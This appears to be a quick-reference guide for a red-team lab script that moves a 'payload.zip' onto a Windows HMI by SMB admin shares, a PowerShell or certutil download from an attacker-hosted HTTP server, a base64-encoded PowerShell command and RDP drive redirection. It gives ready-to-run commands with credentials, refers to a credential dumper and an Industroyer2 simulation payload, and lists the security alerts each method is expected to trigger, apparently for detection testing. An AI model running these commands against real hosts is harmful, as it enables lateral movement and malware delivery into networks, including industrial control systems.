# File Transfer Methods - Quick Reference Guide

## All 4 Transfer Methods Implemented

**Default Credentials:** `operator:labpass123`

---

## Method 1: SMB File Transfer

**Use when:** Direct file copy to administrative shares (C$, ADMIN$)

**Command:**
```bash
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method smb \
  --file payload.zip \
  --username operator \
  --password labpass123
```

**How it works:**
1. Connects to `\\192.168.1.55\C$` using smbclient
2. Authenticates with provided credentials
3. Copies file directly to `C:\Temp\`

**Expected Alerts:**
- Cortex XDR: SMB Lateral Movement
- Device Security: SMB File Transfer to Admin Share
- XSIAM: Authenticated SMB File Copy

**Requirements:**
- smbclient installed (`apt-get install smbclient`)
- SMB port 445 open
- Valid credentials with admin share access

---

## Method 2: HTTP Download

**Use when:** Need to download file from external server

**Command:**
```bash
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method http \
  --file payload.zip \
  --attacker-ip 192.168.0.11 \
  --username operator \
  --password labpass123
```

**How it works:**
1. Starts Python HTTP server on attacker machine (port 8000)
2. Connects to target via PsExec/WMI
3. Executes: `Invoke-WebRequest -Uri http://192.168.0.11:8000/payload.zip -OutFile C:\Temp\payload.zip`
4. Alternative: Uses certutil.exe if PowerShell fails

**Expected Alerts:**
- Cortex XDR: PowerShell Network Activity
- Device Security: HTTP Download from External IP
- WildFire: Downloaded File Analysis
- Cortex XDR: LOLBin Abuse (if certutil used)

**Requirements:**
- impacket-psexec installed
- HTTP port 8000 accessible from target
- PowerShell or certutil on target

---

## Method 3: PowerShell In-Memory Transfer

**Use when:** Need to avoid writing unencoded files initially

**Command:**
```bash
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method powershell \
  --file payload.zip \
  --username operator \
  --password labpass123
```

**How it works:**
1. Reads local file and base64 encodes it
2. Creates PowerShell script to decode and write file
3. Base64 encodes the PowerShell script itself
4. Executes: `powershell.exe -EncodedCommand <base64_script>`
5. Script decodes data and writes to disk

**Expected Alerts:**
- Cortex XDR: Encoded PowerShell Command
- Cortex XDR: PowerShell Base64 Encoded Content
- XSIAM: Obfuscated File Transfer
- Device Security: Suspicious PowerShell Activity

**Requirements:**
- impacket-psexec installed
- PowerShell on target
- Remote execution permissions

---

## Method 4: RDP Drive Redirection

**Use when:** Interactive session with file transfer

**Command:**
```bash
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method rdp \
  --file payload.zip \
  --username operator \
  --password labpass123
```

**How it works:**
1. Uses xfreerdp to establish RDP session
2. Mounts local directory as `\\tsclient\share`
3. Copies file from mounted drive to target
4. Alternative: Authenticated SMB copy (simulates RDP transfer)

**Expected Alerts:**
- Cortex XDR: RDP Authentication
- Device Security: RDP Connection
- XSIAM: Interactive Login Pattern
- Device Security: Drive Redirection Activity

**Requirements:**
- xfreerdp installed (`apt-get install freerdp2-x11`)
- RDP port 3389 open
- RDP enabled on target

**Manual RDP Transfer:**
```bash
xfreerdp /v:192.168.1.55 /u:operator /p:labpass123 /drive:share,/path/to/files
# In RDP session:
copy \\tsclient\share\payload.zip C:\Temp\
```

---

## Method 5: ALL METHODS (Maximum Alerts)

**Use for:** Maximum alert generation across all Palo Alto products

**Command:**
```bash
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method all \
  --file payload.zip \
  --attacker-ip 192.168.0.11 \
  --username operator \
  --password labpass123
```

**What happens:**
1. Transfers file via SMB
2. Transfers file via HTTP download
3. Transfers file via PowerShell in-memory
4. Transfers file via RDP

**Result:** File exists 4 times on target, each with different IOCs

**Expected Alert Count:**
- Cortex XDR: 15-25 alerts
- Device Security: 8-12 alerts
- XSIAM: Multi-method transfer correlation
- WildFire: 2-4 file submissions

---

## Quick Usage Examples

### Transfer payload.zip to HMI
```bash
cd /opt/mrhOTshOT/final_things/iec104_water_tank/attacker_scripts

# Create payload first
zip -r payload.zip \
  ../industroyer2_payload/industroyer2_characteristics.py \
  ../perform_malware_simulations/industroyer2_simulation.py

# Transfer via all methods
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method all \
  --file payload.zip
```

### Transfer single Python script
```bash
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method smb \
  --file 05_credential_dumper.py
```

### Custom remote path
```bash
python3 06_file_transfer_all_methods.py \
  --target 192.168.1.55 \
  --method all \
  --file malware.exe \
  --remote-path 'C$\Windows\Temp'
```

---

## Verification After Transfer

### On Attacker (Check Transfer Success)
```bash
# View transfer summary at end of output
# Look for "[+] SUCCESS" messages

# Check logs
ls -la *.log
```

### On HMI (Windows - Verify Files)
```powershell
# Check if files arrived
Get-ChildItem C:\Temp

# Check file sizes
Get-Item C:\Temp\payload.zip | Select-Object Name, Length

# Verify file integrity (hash)
Get-FileHash C:\Temp\payload.zip -Algorithm SHA256
```

---

## Troubleshooting

### SMB Transfer Fails
**Error:** "NT_STATUS_LOGON_FAILURE" or "Access denied"
- Check credentials: `smbclient -L //192.168.1.55 -U operator%labpass123`
- Verify SMB port: `nc -zv 192.168.1.55 445`
- Check if admin share enabled

### HTTP Transfer Fails
**Error:** "Connection refused" or "Timeout"
- Verify HTTP server started: `curl http://192.168.0.11:8000`
- Check firewall rules
- Ensure target can reach attacker IP

### PowerShell Transfer Fails
**Error:** "Execution policy" or "EncodedCommand failed"
- Check PowerShell version: Must be 5.0+
- Verify remote execution works with simple command first

### RDP Transfer Fails
**Error:** "Connection refused" or "Authentication failure"
- Check RDP enabled: `nc -zv 192.168.1.55 3389`
- Verify credentials work: `xfreerdp /v:192.168.1.55 /u:operator /p:labpass123`
- Check if RDP is blocked by firewall

---

## Integration with Master Orchestrator

The master orchestrator automatically uses **Method 5 (ALL)** in Phase 5:

```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --interactive
# When it reaches Phase 5, it will transfer using all 4 methods
```

To use specific method in orchestrator, modify line 317:
```python
# Change --method all to --method smb (or http, powershell, rdp)
cmd = f'python3 06_file_transfer_all_methods.py ... --method smb'
```

---

## Alert Monitoring Checklist

After running transfers, check these in Palo Alto products:

**Cortex XDR:**
- [ ] SMB lateral movement alert
- [ ] PowerShell network activity
- [ ] Encoded PowerShell command
- [ ] RDP authentication
- [ ] Remote code execution

**Device Security:**
- [ ] SMB file transfer to admin share
- [ ] HTTP download from external IP
- [ ] Suspicious PowerShell network connections
- [ ] RDP connection

**XSIAM:**
- [ ] File transfer correlation across multiple methods
- [ ] Attack chain linkage from previous phases
- [ ] Lateral movement pattern

**WildFire:**
- [ ] Payload.zip submission and analysis
- [ ] Behavior analysis of transferred files

---

## Summary

**All 4 methods are fully implemented and execute real commands:**
- [+] SMB: Actually uses smbclient to copy files
- [+] HTTP: Actually starts HTTP server and downloads via PowerShell
- [+] PowerShell: Actually base64 encodes and transfers in-memory
- [+] RDP: Actually attempts xfreerdp with drive redirection

**No shortcuts, no simulations, no placeholders** in file transfer implementations.

**Default credentials work:** `operator:labpass123`
